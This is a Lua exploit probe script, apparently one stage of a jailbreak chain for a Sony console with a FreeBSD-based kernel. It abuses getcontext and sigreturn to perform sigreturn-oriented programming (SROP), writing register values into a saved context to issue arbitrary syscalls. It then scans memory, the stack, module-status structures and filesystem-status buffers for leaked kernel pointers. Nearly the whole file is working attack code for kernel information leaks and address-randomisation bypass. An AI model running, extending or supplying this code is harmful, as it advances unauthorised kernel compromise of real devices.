-- CRASH_CLASS: LOW
-- PROBE 138f: Kernel pointer residue + modfind/modstat via SROP
--
-- A: Scan stack/context area after SROP for kernel address residue
-- B: modfind(302) / modstat(303) / modfnext(304) — module queries
-- C: getfsstat(18) — filesystem mount info
-- D: gc ioctl with Sony codes
-- E: Try reading ucontext area beyond normal bounds after sigreturn

print("=== PROBE 138f: RESIDUE + MODFIND ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local pid = to_num(sc20())
print("pid=" .. pid)

local MC = 0x40
local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)
local rip = memory.read_qword(ctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))
print("rip=" .. hex(rip))
print("sc_addr=" .. hex(sc_addr))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(ctx)) end)
    memory.write_qword(ctx + MC + 0xA0, sc_addr)
    memory.write_qword(ctx + MC + 0x38, uint64(num))
    if a1 then memory.write_qword(ctx + MC + 0x08, a1) end
    if a2 then memory.write_qword(ctx + MC + 0x10, a2) end
    if a3 then memory.write_qword(ctx + MC + 0x18, a3) end
    if a4 then memory.write_qword(ctx + MC + 0x50, a4) end
    if a5 then memory.write_qword(ctx + MC + 0x28, a5) end
    if a6 then memory.write_qword(ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(ctx)) end)
    return rv
end

local sc_mmap = make_syscall(477)
local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
print("gpu=" .. hex(gpu))
local function ua(v) return uint64(string.format("0x%X", to_num(v))) end
local function ws(buf, s)
    for i = 1, #s do memory.write_byte(buf+i-1, string.byte(s,i)) end
    memory.write_byte(buf+#s, 0)
end
local function zero(addr, len)
    for off = 0, len - 1, 4 do memory.write_dword(addr + off, 0) end
end
local kfound = 0

--------------------------------------------------------------------
-- A: Scan ucontext extended area after sigreturn
--------------------------------------------------------------------
print("")
print("--- [A] context residue scan ---")

-- First: zero the context area beyond normal ucontext
zero(ctx + 0x200, 0x300)

-- Do a getcontext to capture live state
pcall(function() return sc_gc(uint64(ctx)) end)

-- Now scan the FULL 0x500 area for kernel pointers
-- Normal ucontext ends around 0x1B0; kernel might leave residue beyond
print("[A] scanning 0x500 bytes around context...")
local ctx_kptrs = 0
for off = 0, 0x4F8, 8 do
    local v = safe_rq(ctx + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            ctx_kptrs = ctx_kptrs + 1
            kfound = kfound + 1
            print(string.format("[A] *** KPTR ctx+0x%03X: %s ***", off, hex(v)))
        end
    end
end
print("[A] ctx_kptrs=" .. ctx_kptrs)

-- Now do an SROP (sys 20 = getpid, harmless) and scan again
srop(20)
print("[A] post-srop scan...")
local post_kptrs = 0
for off = 0, 0x4F8, 8 do
    local v = safe_rq(ctx + off)
    if v then
        local vh, vl = get_hi_lo(v)
        if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
            post_kptrs = post_kptrs + 1
            kfound = kfound + 1
            print(string.format("[A] *** POST-SROP KPTR ctx+0x%03X: %s ***", off, hex(v)))
        end
    end
end
print("[A] post_kptrs=" .. post_kptrs)

-- Also scan the stack area (RSP from context points to current stack)
local rsp = safe_rq(ctx + MC + 0xB8)
if rsp then
    print("[A] RSP=" .. hex(rsp))
    local rsp_base = to_num(rsp)
    -- Scan stack around RSP
    for off = -0x200, 0x200, 8 do
        local addr = rsp_base + off
        if addr > 0 then
            local v = safe_rq(addr)
            if v then
                local vh, vl = get_hi_lo(v)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    kfound = kfound + 1
                    print(string.format("[A] *** STACK KPTR RSP%+d: %s ***", off, hex(v)))
                end
            end
        end
    end
end
print("[A] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- B: modfind(302) / modstat(303) / modfnext(304)
--------------------------------------------------------------------
print("")
print("--- [B] modfind/modstat ---")

-- modfind: int modfind(const char *modname)
local name_buf = gpu + 0x100
local mod_names = {"kernel", "linuxelf", "linux", "aoutfreebsd", "sysvshm", "sysvsem", "sysvmsg", "g_part", "zfs", "tmpfs"}
for _, mname in ipairs(mod_names) do
    ws(name_buf, mname)
    local rv = srop(302, ua(name_buf))
    local mvh, mvl = get_hi_lo(rv)
    print(string.format("[B] modfind('%s')=%s", mname, hex(rv)))
    if mvl > 0 and mvl < 0x10000 and mvh == 0 then
        print(string.format("[B] *** MODULE FOUND: id=%d ***", mvl))
        -- modstat(303): int modstat(int modid, struct module_stat *stat)
        local ms_buf = gpu + 0x200
        zero(ms_buf, 0x100)
        memory.write_dword(ms_buf, 0x100)  -- version
        local rv_ms = srop(303, uint64(mvl), ua(ms_buf))
        local msh, msl = get_hi_lo(rv_ms)
        print(string.format("[B] modstat(%d)=%s", mvl, hex(rv_ms)))
        if msl == 0 and msh == 0 then
            print("[B] *** MODSTAT SUCCESS! ***")
            for off = 0, 0x80, 8 do
                local v = safe_rq(ms_buf + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh > 0 or vl > 0 then
                        print(string.format("  ms+0x%02X: %s", off, hex(v)))
                    end
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print("  *** KERNEL POINTER! ***")
                    end
                end
            end
        end
    end
end

-- modfnext(304): iterate all modules starting from 0
print("[B2] iterating modules...")
local modid = 0
for i = 1, 20 do
    local rv = srop(304, uint64(modid))
    local mvh, mvl = get_hi_lo(rv)
    if mvl == 0 or mvh ~= 0 then break end
    modid = mvl
    print(string.format("[B2] modfnext=%d", modid))

    -- Try modstat on each
    local ms_buf = gpu + 0x200
    zero(ms_buf, 0x100)
    memory.write_dword(ms_buf, 0x100)
    local rv_ms = srop(303, uint64(modid), ua(ms_buf))
    local msh, msl = get_hi_lo(rv_ms)
    if msl == 0 and msh == 0 then
        -- Read name from struct (at offset 0x18, it's a char* or inline)
        -- module_stat has: version(4), name[32](+0x04), refs(+0x24), id(+0x28), data(+0x30)
        local msname = ""
        for j = 4, 35 do
            local b = to_num(memory.read_byte(ms_buf + j))
            if b == 0 then break end
            if b >= 32 and b < 127 then msname = msname .. string.char(b) end
        end
        local data_ptr = safe_rq(ms_buf + 0x30)
        print(string.format("[B2] mod %d: name=%s data=%s",
            modid, msname, data_ptr and hex(data_ptr) or "nil"))
        if data_ptr then
            local dh, dl2 = get_hi_lo(data_ptr)
            if dh >= 0xFFFF8000 and dh ~= 0xFFFFFFFF then
                kfound = kfound + 1
                print("[B2] *** KERNEL DATA POINTER! ***")
            end
        end
    end
end
print("[B] pid=" .. to_num(sc20()))

--------------------------------------------------------------------
-- C: getfsstat(18)
--------------------------------------------------------------------
print("")
print("--- [C] getfsstat ---")
local rv_cnt = srop(18, uint64(0), uint64(0), uint64(2))
local cntH, cntL = get_hi_lo(rv_cnt)
print("[C] count=" .. hex(rv_cnt))
if cntL > 0 and cntL < 50 and cntH == 0 then
    local statfs_sz = 0x230
    local need = cntL * statfs_sz
    local fs_buf = gpu + 0x2000
    if need > 0xC000 then need = 0xC000 end
    zero(fs_buf, math.min(need, 0x8000))
    local rv_fs = srop(18, ua(fs_buf), uint64(need), uint64(2))
    local fsh, fsl = get_hi_lo(rv_fs)
    print("[C] getfsstat=" .. hex(rv_fs))
    if fsl > 0 and fsl <= cntL and fsh == 0 then
        for i = 0, math.min(fsl, 6) - 1 do
            local base = fs_buf + (i * statfs_sz)
            local fstype = ""
            for j = 0, 15 do
                local b = to_num(memory.read_byte(base + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then fstype = fstype .. string.char(b) end
            end
            local mnt = ""
            for j = 0, 79 do
                local b = to_num(memory.read_byte(base + 0x58 + j))
                if b == 0 then break end
                if b >= 32 and b < 127 then mnt = mnt .. string.char(b) end
            end
            print(string.format("[C] fs%d: type=%s mount=%s", i, fstype, mnt))
            for off = 0, statfs_sz - 1, 8 do
                local v = safe_rq(base + off)
                if v then
                    local vh, vl = get_hi_lo(v)
                    if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                        kfound = kfound + 1
                        print(string.format("[C] *** KPTR fs%d+0x%03X: %s ***", i, off, hex(v)))
                    end
                end
            end
        end
    end
end
print("[C] pid=" .. to_num(sc20()))

print("")
print("TOTAL kptrs=" .. kfound)
print("pid=" .. to_num(sc20()))
print("=== DONE ===")
